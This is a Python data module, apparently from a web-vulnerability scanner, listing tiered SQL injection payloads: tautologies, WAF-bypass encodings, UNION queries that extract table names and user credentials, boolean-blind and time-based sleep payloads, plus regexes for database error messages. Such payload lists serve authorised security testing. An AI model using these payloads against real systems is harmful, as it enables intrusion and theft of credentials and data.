"""SQL Injection payloads — 3-tier system."""

# ── Tier 1: Fast error-based and tautologies ──────────────────────────────────
SQLI_T1 = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

# ── Tier 2: WAF bypass + encoding variants ────────────────────────────────────
SQLI_T2 = [
    # URL-encoded apostrophes
    "%27 OR %271%27=%271",
    # Null-byte
    "'\x00 OR '1'='1",
    # Double-dash comment variants
    "' OR 1=1#",
    "' OR 1=1/*",
    # Hexadecimal encoding
    "0x27 OR 0x31=0x31",
    # Case variation
    "' oR '1'='1",
    # Whitespace bypass (tabs, newlines)
    "'\tOR\t'1'='1",
    "'\nOR\n'1'='1",
    # Inline comment bypass
    "' OR/**/1=1--",
    # Double-URL encoding
    "%2527 OR %25271%2527=%25271",
]

# ── Tier 3: UNION-based extraction ────────────────────────────────────────────
SQLI_T3 = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' UNION SELECT username,password,3 FROM users--",
    "' UNION SELECT user(),version(),database()--",
]

# ── Blind: Boolean-based ──────────────────────────────────────────────────────
SQLI_BLIND = [
    ("' AND 1=1--", "' AND 1=2--"),   # (true, false) pair
    ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    ("' AND SUBSTRING(username,1,1)='a'--", "' AND SUBSTRING(username,1,1)='z'--"),
]

# ── Time-based (Oracle decides via elapsed > threshold) ───────────────────────
SQLI_TIME = [
    "'; SELECT SLEEP(5)--",           # MySQL
    "'; WAITFOR DELAY '0:0:5'--",     # MSSQL
    "'; SELECT pg_sleep(5)--",        # PostgreSQL
    "1 AND SLEEP(5)",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5) AND '1'='1",
]

# ── Response error signatures ─────────────────────────────────────────────────
SQLI_ERRORS = [
    # MySQL
    r"you have an error in your sql syntax",
    r"mysql_fetch",
    r"warning: mysql",
    r"supplied argument is not a valid mysql",
    r"unclosed quotation mark",
    # PostgreSQL
    r"pg_query\(\)",
    r"psqlexception",
    r"unterminated quoted string",
    # MSSQL
    r"microsoft sql server",
    r"odbc sql server driver",
    r"ole db provider for sql server",
    r"unclosed quotation mark after the character string",
    # Oracle
    r"ORA-\d{5}",
    r"oracle error",
    # SQLite
    r"sqlite3?\.\w+error",
    r"sqlite.*failed",
    # Generic
    r"sql syntax.*mysql",
    r"syntax error.*sql",
    r"unrecognized token",
    r"sqlstate",
]
